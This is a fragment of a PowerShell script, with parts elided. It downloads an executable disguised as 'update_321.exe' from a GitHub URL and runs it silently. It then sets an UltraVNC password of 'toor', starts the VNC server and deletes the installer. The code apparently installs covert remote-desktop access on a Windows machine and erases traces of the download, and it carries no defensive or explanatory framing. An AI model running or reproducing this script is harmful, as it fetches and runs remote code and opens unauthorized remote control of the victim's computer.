...
#Start-Sleep -Seconds 1 -ErrorAction Stop
$client.DownloadFile("https://raw.githubusercontent.com/srbhptl39/automation/master/update_321.exe","$Env:USERPROFILE\update_321.exe") ;
...
& $Env:USERPROFILE\update_321.exe /SP- /VERYSILENT /NORESTART -ErrorAction Stop
...
& 'C:\Program Files (x86)\uvnc bvba\UltraVNC\setpasswd.exe' "toor";
#& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -install;
Start-Sleep -Seconds 1 -ErrorAction Stop
& 'C:\Program Files (x86)\uvnc bvba\UltraVNC\winvnc.exe' -run;
...
Remove-Item –path "$Env:USERPROFILE\update_321.exe";
exit;
